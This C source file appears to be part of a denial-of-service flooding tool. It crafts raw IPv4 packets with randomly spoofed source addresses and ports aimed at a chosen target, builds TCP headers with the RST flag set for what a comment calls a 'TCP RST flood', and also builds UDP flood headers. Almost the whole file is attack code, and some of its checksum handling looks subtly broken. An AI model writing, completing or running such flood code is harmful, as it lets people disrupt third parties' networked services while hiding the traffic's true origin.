#include "packets.h"

void get_random_ip(char *ip_buffer)
{
	// Gives 4 numbers from 0 to 255 (first number can't start with 0) with '.' seperator
	sprintf(ip_buffer, "%u.%u.%u.%u", (rand() % 256) + 1, rand() % 256, rand() % 256, rand() % 256);
}

void get_random_port(__u_int *port)
{
	*port = (rand() % 65535) + 1; //Gives a number between 1 and 65535
}

unsigned short checksum(unsigned short *ptr, int nbytes)
{
	register long sum;
	unsigned short oddbyte;
	register short answer;

	sum = 0;
	while (nbytes > 1)
	{
		sum += *ptr++;
		nbytes -= 2;
	}
	if (nbytes == 1)
	{
		oddbyte = 0;
		*((__u_char *)&oddbyte) = *(__u_char *)ptr;
		sum += oddbyte;
	}

	sum = (sum >> 16) + (sum & 0xffff);
	sum = sum + (sum >> 16);
	answer = (short)~sum;

	return (answer);
}

void create_packet(char *packet, struct packet_settings *settings)
{
	// Set fake random source details:
	get_random_ip(settings->source_ip_address);
	get_random_port(&settings->source_port);

	// Initialize IPv4 header and set fields according to the attack type (TCP/UDP):
	struct iphdr iph;
	iph.version = 4;
	iph.ihl = 5;
	iph.ttl = 20;
	iph.saddr = inet_addr(settings->source_ip_address);
	iph.daddr = inet_addr(settings->target_ip_address);
	iph.protocol = settings->protocol;
	iph.tot_len = (settings->protocol == IPPROTO_UDP) ? UDP_PACKET_LENGTH : TCP_PACKET_LENGTH;

	memcpy(packet, &iph, sizeof(struct iphdr)); // Copy the IP header to our packet buffer.

	// Create TCP/UDP header according to our settings:
	(settings->protocol == IPPROTO_UDP) ? create_udp_header(packet, settings) : create_tcp_header(packet, settings);

	// Calculate checksum for the entire packet:
	iph.check = checksum((unsigned short *)packet, iph.tot_len >> 1);
}

void create_tcp_header(char *packet, struct packet_settings *settings)
{
	// Initialize TCP header and set fields according to settings:
	struct tcphdr tcph;
	tcph.source = htons(settings->source_port);
	tcph.dest = htons(settings->target_port);
	tcph.seq = 0;
	tcph.ack_seq = 0;
	tcph.doff = 5;
	tcph.fin = 0;
	tcph.syn = 0;
	tcph.rst = 1; //Set the RST flag for TCP RST flood
	tcph.ack = 0;
	tcph.window = htons(5840); // Maximum allowed window size
	tcph.check = 0;
	tcph.urg_ptr = 0;

	// Initialize TCP pseudo header for checksum calculation:
	struct tcp_pseudo_header psh;
	psh.source_address = inet_addr(settings->source_ip_address);
	psh.dest_address = inet_addr(settings->target_ip_address);
	;
	psh.placeholder = 0;
	psh.protocol = IPPROTO_TCP;
	psh.tcp_length = htons(sizeof(struct tcphdr));

	memcpy(&psh.tcp, &tcph, sizeof(struct tcphdr)); // Copy original TCP header to pseudo header field

	tcph.check = checksum((unsigned short *)&psh, sizeof(struct tcp_pseudo_header)); // Calculate TCP header checksum

	memcpy(packet + sizeof(struct iphdr), &tcph, sizeof(struct tcphdr)); // Copy TCP header to our packet.
}

void create_udp_header(char *packet, struct packet_settings *settings)
{
	// Initialize UDP header and set fields according to settings:
	struct udphdr udp;
	udp.uh_sport = htons(settings->source_port);
	udp.uh_dport = htons(settings->target_port);
	udp.uh_ulen = htons(sizeof(struct udphdr));

	// Initialize UDP pseudo header for checksum calculation:
	struct udp_pseudo_header psh;
	psh.source_address = inet_addr(settings->source_ip_address);
	psh.dest_address = inet_addr(settings->target_ip_address);
	psh.placeholder = 0;
	psh.protocol = IPPROTO_UDP;
	psh.udp_length = htons(sizeof(struct udphdr));

	memcpy(&psh.udp, &udp, sizeof(struct udphdr)); // Copy original UDP header to pseudo header field

	udp.check = checksum((unsigned short *)&psh, sizeof(struct udp_pseudo_header)); // Calculate UDP header checksum

	memcpy(packet + sizeof(struct iphdr), &udp, sizeof(struct udphdr)); // Copy UDP header to our packet.
}